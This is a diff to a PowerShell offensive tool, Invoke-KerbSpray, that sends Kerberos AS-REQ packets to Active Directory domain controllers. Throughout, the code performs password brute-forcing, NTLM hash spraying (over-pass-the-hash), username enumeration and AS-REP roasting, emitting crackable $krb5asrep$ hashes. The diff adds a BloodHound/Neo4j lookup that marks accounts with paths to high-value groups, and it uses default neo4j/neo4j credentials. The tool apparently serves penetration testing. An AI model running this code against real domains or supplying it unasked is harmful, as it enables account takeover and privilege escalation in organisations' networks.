@@ -1,13 +1,13 @@
 function Invoke-KerbSpray {
 <#
 .SYNOPSIS
-    Audit Active Directory accounts using Kerberos preauthentication.
+    Check Active Directory accounts using Kerberos preauthentication.
 
     Author: Timothee MENOCHET (@TiM0)
 
 .DESCRIPTION
-    Invoke-KerbSpray checks accounts' usernames and credentials by sending a Kerberos AS-REQ.
-    This function can typically be used to identify credential reuse between a previously compromised domain and a target domain.
+    Invoke-KerbSpray validates accounts' usernames and credentials by sending a Kerberos AS-REQ.
+    This function can for example be used to identify credential reuse between a previously compromised domain and a target domain.
     It is highly inspired from tools Rubeus and ASREPRoast written by @harmj0y.
 
 .PARAMETER Username
@@ -31,6 +31,18 @@ function Invoke-KerbSpray {
 .PARAMETER Server
     Specify a specific domain controller to send the AS-REQ to.
 
+.PARAMETER BloodHound
+    Enable Bloodhound integration.
+
+.PARAMETER Credential
+    Specifies credentials for Neo4j database.
+
+.PARAMETER Neo4jHost
+    Specifies Neo4j server address.
+
+.PARAMETER Neo4jPort
+    Specifies Neo4j server port.
+
 .EXAMPLE
     PS C:\> Invoke-KerbSpray -UserName testuser -Domain ADATUM.CORP -Server 192.168.1.10
 
@@ -46,39 +58,48 @@ function Invoke-KerbSpray {
 
     [CmdletBinding()]
     Param (
-        [Parameter(Mandatory = $False)]
         [ValidateNotNullOrEmpty()]
         [String]
         $Username,
 
-        [Parameter(Mandatory = $False)]
         [ValidateNotNullOrEmpty()]
         [String]
         $UserFile,
 
-        [Parameter(Mandatory = $False)]
         [String]
         $Password,
 
-        [Parameter(Mandatory = $False)]
         [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
         [String]
         $Hash,
 
-        [Parameter(Mandatory = $False)]
         [ValidateNotNullOrEmpty()]
         [String]
         $DumpFile,
 
-        [Parameter(Mandatory = $False)]
         [ValidateNotNullOrEmpty()]
         [String]
         $Domain,
 
-        [Parameter(Mandatory = $False)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $Server
+        $Server,
+
+        [Switch]
+        $BloodHound,
+
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]
+        $Credential = (New-Object System.Management.Automation.PSCredential ("neo4j", $(ConvertTo-SecureString 'neo4j' -AsPlainText -Force))),
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Neo4jHost = '127.0.0.1',
+
+        [ValidateNotNullOrEmpty()]
+        [Int]
+        $Neo4jPort = 7474
     )
 
     if ($Domain -and -not $Server) {
@@ -90,7 +111,7 @@ function Invoke-KerbSpray {
         $Domain = $DomainObject.rootDomainNamingContext[0] -replace 'DC=' -replace ',','.'
     }
     elseif (-not $Domain -and -not $Server) {
-        Write-Error "Domain or Server parameter must be specified"
+        Write-Error "Domain or Server parameter must be specified" -ErrorAction Stop
     }
 
     if($Hash -like "*:*") {
@@ -99,14 +120,14 @@ function Invoke-KerbSpray {
 
     $credentials = New-Object System.Collections.ArrayList
     if ($Username) {
-        $credential = @{Username = $Username; Password = $Password; Hash = $Hash}
-        $credentials.add($credential) | Out-Null
+        $cred = @{Username = $Username; Password = $Password; Hash = $Hash}
+        $credentials.add($cred) | Out-Null
     }
     elseif ($UserFile) {
         $UserFilePath = Resolve-Path -Path $UserFile
         ForEach ($user in Get-Content $UserFilePath) {
-            $credential = @{Username = $user; Password = $Password; Hash = $Hash}
-            $credentials.add($credential) | Out-Null
+            $cred = @{Username = $user; Password = $Password; Hash = $Hash}
+            $credentials.add($cred) | Out-Null
         }
     }
     elseif ($DumpFile) {
@@ -119,28 +140,131 @@ function Invoke-KerbSpray {
                     $user = $user.split('\')[1]
                 }
                 $nthash = $dump[3]
-                $credential = @{Username = $user; Password = $Password; Hash = $nthash}
-                $credentials.add($credential) | Out-Null
+                $cred = @{Username = $user; Password = $Password; Hash = $nthash}
+                $credentials.add($cred) | Out-Null
             }
         }
     }
     else {
-        Write-Error "UserName, UserFile or DumpFile parameter must be specified"
+        Write-Error "UserName, UserFile or DumpFile parameter must be specified" -ErrorAction Stop
     }
 
-    ForEach ($credential in $credentials) {
-        if ($credential.Password) {
+    ForEach ($cred in $credentials) {
+        if ($cred.Password) {
             # Kerberos pre-authentication using plain-text password (bruteforce)
-            Invoke-KerbPreauth -UserName $credential.Username -Password $credential.Password -Domain $Domain -Server $Server
+            $asn_AS_REP = Invoke-KerbPreauth -UserName $cred.Username -Password $cred.Password -Domain $Domain -Server $Server
         }
-        elseif ($credential.Hash) {
+        elseif ($cred.Hash) {
             # Kerberos pre-authentication using NTLM hash (over-pass-the-hash)
-            Invoke-KerbPreauth -UserName $credential.Username -Hash $credential.Hash -Domain $Domain -Server $Server
+            $asn_AS_REP = Invoke-KerbPreauth -UserName $cred.Username -Hash $cred.Hash -Domain $Domain -Server $Server
         }
         else {
             # Kerberos pre-authentication without credentials (user enumeration)
-            Invoke-KerbPreauth -UserName $credential.Username -Domain $Domain -Server $Server
+            $asn_AS_REP = Invoke-KerbPreauth -UserName $cred.Username -Domain $Domain -Server $Server
         }
+
+        $Tag = $asn_AS_REP.TagValue
+        # ERR_PREAUTH_REQUIRED
+        # https://tools.ietf.org/html/rfc1510#section-8.3
+        if ($Tag -eq 30) {
+            $temp = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
+            $error_code = [Convert]::ToUInt32($temp.Sub[0].GetInteger())
+
+            # KDC_ERR_PREAUTH_REQUIRED
+            if ($error_code -eq 25) {
+                Write-Host "[+] $($cred.Username)@$($Domain) exists"
+            }
+            # KDC_ERR_CLIENT_REVOKED
+            elseif ($error_code -eq 18) {
+                Write-Host "[*] $($cred.Username)@$($Domain) account disabled or locked out"
+            }
+            # KDC_ERR_C_PRINCIPAL_UNKNOWN
+            elseif ($error_code -eq 6) {
+                Write-Verbose "$($cred.Username)@$($Domain) does not exist"
+            }
+            # KDC_ERR_PREAUTH_FAILED
+            elseif ($error_code -eq 24) {
+                Write-Verbose "$($cred.Username)@$($Domain) failed to authenticate"
+            }
+            # KRB_AP_ERR_SKEW
+            elseif ($error_code -eq 37) {
+                if ($BloodHound) {
+                    $pathNb = 0
+                    $bhPath = $null
+                    #$query = "MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group),p=shortestPath((n)-[r*1..]->(m)) WHERE m.objectsid ENDS WITH "-512"  RETURN COUNT(p) AS pathNb"
+                    $query = "
+                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
+                    RETURN COUNT(p) AS pathNb
+                    "
+                    try {
+                        $result = Invoke-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
+                        $pathNb = $result.data[0] | Where-Object {$_}
+                        if ($pathNb -gt 0) {
+                            $bhPath = '[PATH TO HIGH VALUE TARGETS]'
+                        }
+                    }
+                    catch {
+                        Write-Warning $Error[0].ErrorDetails.Message
+                    }
+                }
+                Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated! " -NoNewline
+                Write-Host $bhPath -ForegroundColor Red
+            }
+            # KDC_ERR_WRONG_REALM
+            elseif ($error_code -eq 68) {
+                Write-Error "Invalid Kerberos REALM: $Domain" -ErrorAction Stop
+            }
+            # KDC_ERR_ETYPE_NOSUPP
+            elseif ($error_code -eq 14) {
+                Write-Warning "$($cred.Username)@$($Domain) preauthentication failed because KDC has no support for encryption type"
+            }
+            else {
+                Write-Warning "Unknown error code for '$($cred.Username)@$($Domain): $error_code"
+            }
+        }
+        # AS-REP
+        elseif ($Tag -eq 11) {
+            Write-Host "[+] $($cred.Username)@$($Domain) exists and does not require Kerberos preauthentication!"
+            $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
+            $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
+            $cipher = $temp.Sub[0].GetOctetString()
+            $repHash = [BitConverter]::ToString($cipher).Replace("-", $null)
+            $asrepHash = $repHash.Insert(32, '$')
+            "`$krb5asrep`$$($cred.Username)@$($Domain):$($asrepHash)"
+        }
+        else {
+            Write-Warning "Unknown tag number for '$($cred.Username)@$($Domain): $Tag'"
+        }
+    }
+}
+
+function Local:Invoke-BloodHoundQuery {
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Neo4jHost = '127.0.0.1',
+
+        [ValidateNotNullOrEmpty()]
+        [Int32]
+        $Neo4jPort = 7474,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Query,
+
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]
+        $Credential = [System.Management.Automation.PSCredential]::Empty
+    )
+
+    $Uri = "http://$($Neo4jHost):$($Neo4jPort)/db/data/cypher"
+    $Header = @{'Accept'='application/json; charset=UTF-8'; 'Content-Type'='application/json'}
+    $Body = @{query=$Query} | ConvertTo-Json
+    $reply = Invoke-RestMethod -Uri $Uri -Method Post -Headers $Header -Body $Body -Credential $Credential
+    if($reply){
+        return $reply
     }
 }
 
@@ -179,7 +303,7 @@ function Local:Invoke-KerbPreauth {
     $Socket.TTL = 128
 
     if ($Password) {
-        # KERB_ETYPE 23 = AES256-CTS-HMAC-SHA1-96
+        # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
         $salt = "$($Domain.ToUpper())$($Username)"
         $keyBytes = Get-AES256Key -Password $Password -Salt $salt
         $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType 18 -Key $keyBytes
@@ -209,60 +333,7 @@ function Local:Invoke-KerbPreauth {
         throw "Error sending AS-REQ to '$TargetDCIP' : $_"
     }
     $ResponseData = $ResponseBuffer[4..$($BytesReceived-1)]
-    $asn_AS_REP = [Asn1.AsnElt]::Decode($ResponseData, $false)
-    $Tag = $asn_AS_REP.TagValue
-
-    # ERR_PREAUTH_REQUIRED
-    # https://tools.ietf.org/html/rfc1510#section-8.3
-    if ($Tag -eq 30) {
-        $temp = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
-        $error_code = [Convert]::ToUInt32($temp.Sub[0].GetInteger())
-
-        # KDC_ERR_PREAUTH_REQUIRED
-        if ($error_code -eq 25) {
-            Write-Host "[+] $($Username)@$($Domain) exists"
-        }
-        # KDC_ERR_CLIENT_REVOKED
-        elseif ($error_code -eq 18) {
-            Write-Host "[*] $($Username)@$($Domain) account disabled or locked out"
-        }
-        # KDC_ERR_C_PRINCIPAL_UNKNOWN
-        elseif ($error_code -eq 6) {
-            Write-Verbose "$($Username)@$($Domain) does not exist"
-        }
-        # KDC_ERR_PREAUTH_FAILED
-        elseif ($error_code -eq 24) {
-            Write-Verbose "$($Username)@$($Domain) failed to authenticate"
-        }
-        # KRB_AP_ERR_SKEW
-        elseif ($error_code -eq 37) {
-            Write-Host "[+] $($Username)@$($Domain) successfully authenticated!"
-        }
-        # KDC_ERR_WRONG_REALM
-        elseif ($error_code -eq 68) {
-            Write-Error "Invalid Kerberos REALM: $Domain"
-        }
-        # KDC_ERR_ETYPE_NOSUPP
-        elseif ($error_code -eq 14) {
-            Write-Warning "$($Username)@$($Domain) preauthentication failed because KDC has no support for encryption type"
-        }
-        else {
-            Write-Warning "Unknown error code for '$($Username)@$($Domain): $error_code"
-        }
-    }
-    # AS-REP
-    elseif ($Tag -eq 11) {
-        Write-Host "[+] $($Username)@$($Domain) exists and does not require Kerberos preauthentication!"
-        $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
-        $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
-        $cipher = $temp.Sub[0].GetOctetString()
-        $repHash = [BitConverter]::ToString($cipher).Replace("-", $null)
-        $asrepHash = $repHash.Insert(32, '$')
-        "`$krb5asrep`$$($Username)@$($Domain):$($asrepHash)"
-    }
-    else {
-        Write-Warning "Unknown tag number for '$($Username)@$($Domain): $Tag'"
-    }
+    return [Asn1.AsnElt]::Decode($ResponseData, $false)
 }
 
 function Local:New-ASReq {
